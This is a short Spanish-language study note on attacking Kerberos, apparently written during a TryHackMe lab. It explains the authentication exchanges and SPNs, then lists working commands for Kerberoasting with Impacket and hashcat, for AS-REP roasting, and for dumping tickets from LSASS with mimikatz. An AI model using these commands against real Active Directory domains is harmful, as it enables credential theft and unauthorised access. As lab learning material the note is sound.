# Attacking Kerberos

![Captura](/assets/Captura.PNG)


## Proceso de autenticación
### Pre autenticacion
1. Se hace enviando un mensaje de tipo **AS_REQ**

    *AS_REQ = Nombre cliente + Nombre principal del servicio (SPN) + (timesnap + hash(password))*
2. En caso de EXITO Se recibe el mensaje **AS_REP**
   Este nos envia el TGT 
    *AS_REP = Nombre cliente + (Cip(session key) + TTL) + TGT(Session Key + Token Info + TTL )*

3. En caso de fallo se recibe el mensaje de tipo **KRB-ERROR**

Algunas cuentas no requieren preautenticación y son vulnerables a **AS REPRoasting**.


### Acceso a servicios 

 * Es necesario tener el ticket TGT.
 * Con el TGT se evita volver a introducir contraseñas en el servidor.

Para obtener el ticket del servicio se realizan los siguientes pasos:

  1. Enviar ticket granting service request **TGS_REQ**
     1. *TGS_REQ = SPN + Nombre Cliente + TIMESTAMP + TGT*
  2. Recibe mensaje  **TGS_REP**


## Conceptos
### Service Principal Names (SPN)
Se usa para identificar a los servicios dentro del DC.
Tienen el formato:
    Service_ID/host[:\d]
    http/WEB01.cohovines.com
    MSSQLSvc/DB01.cohovines.com:1433

### User Principal Names (UPN)
Un servicio puede tener muchos UPN 

### Kerberosasting 

Consiste en consultar un ticket por medio de un SPN, se obtiene el ticket y se crakea el ticket.


sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.211.75 -request -outputfile /home/kali/thm/KerberosServer/salidaHash

hashcat -m 13100 --force  salidaHash /usr/share/wordlists/rockyou.txt

## AS-REP Roasting

Es cuando la preautenticacion esta deshabilitada y obtienes un TGT.
El tipo de hash que usan los paquetes **AS-REP** es *Kerberos 5 AS-REP etype 2*

sudo python3 GetNPUsers.py controller.local/ -no-pass -usersfile /home/kali/thm/KerberosServer/User.txt

## Dumpear los tickets del proceso LSASS 


mimikatz.exe
# verificamos los privilegios
privilege::debug
sekurlsa::tickets /export










